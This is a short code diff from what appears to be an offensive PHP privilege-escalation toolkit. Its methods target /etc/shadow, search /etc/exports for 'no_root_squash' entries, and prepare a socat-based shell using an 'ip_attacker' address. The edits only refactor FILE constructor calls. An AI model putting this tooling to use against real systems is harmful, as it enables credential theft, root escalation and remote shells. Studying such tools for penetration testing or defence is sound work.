@@ -164,7 +164,7 @@ lxc launch SomeAlias MyMachine
     public function misc2etc_shadow($stream){
         $this->ssTitre(__FUNCTION__);
         $filename = "/etc/shadow";
-        $obj_filename = new FILE($filename);
+        $obj_filename = new FILE($this->stream,$filename);
         
         
         
@@ -659,7 +659,7 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $etc_sudoers_path = "/etc/exports";
-        $obj_filename = new FILE($etc_sudoers_path);
+        $obj_filename = new FILE($this->stream,$etc_sudoers_path);
         $whoami = $this->whoami();
         
         $search_data = '/  *(rw, no_root_squash)';
@@ -782,7 +782,7 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         $this->ssTitre(__FUNCTION__);
         $user_name = trim($user_name);
         $user_pass = trim($user_pass);
-        
+        $shell = "/bin/bash";
         $ip_attacker = $this->ip4addr4target($this->ip);
         $filename = "socat";
         $path_remotebin_socat = $this->bin2path($stream,$filename,$ip_attacker);
